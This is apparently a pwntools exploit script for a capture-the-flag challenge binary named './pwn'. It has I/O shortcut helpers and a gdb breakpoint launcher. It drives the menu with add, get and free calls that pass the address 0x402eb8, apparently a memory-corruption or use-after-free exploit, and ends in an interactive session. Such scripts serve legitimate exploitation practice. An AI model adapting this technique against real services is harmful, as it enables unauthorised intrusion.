from pwn import *
#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']
       
rv = lambda x            : io.recv(x)
rl = lambda a=False      : io.recvline(a)
ru = lambda a,b=True     : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sd = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b          : io.sendafter(a,b)
sla = lambda a,b         : io.sendlineafter(a,b)
inter = lambda           : io.interactive()

file_name = "./pwn"
elf=ELF(file_name)
url = ""
port = 0
libc=0
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global io
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,2):
            b_string += f"c\n"
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
        for i in range(1,3):
            b_string += f"c\n"
    if is_start :
        io = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(io,b_string)
        pause()

b_examp=0x40139B
b_add=0x0401421
b_free=0x0401497
b_slice = [
    b_add
]
io = process(file_name)
#debug(b_slice = b_slice,is_pie=1,is_start=1) # 直接启动带pie
debug(b_slice=b_slice,is_pie=0,is_start=1) 
#debug(b_slice = b_slice,is_pie=0,is_start=0) 
#io = remote(url,port)

def cmd(index):
    sla(b"> ",str(index))
def add(username ,password):
    cmd(1)
    sa(b"username: ",p64(username))
    sa(b"password: ",p64(password))
def get(username,password):
    cmd(2)
    sa(b"username: ",p64(username))
    sa(b"password: ",p64(password))
def free():
    cmd(3)
add(0x402eb8,0x402eb8)
get(0x402eb8,0x402eb8)
free()
add(1,1)
get(0,0)
cmd(4)
inter()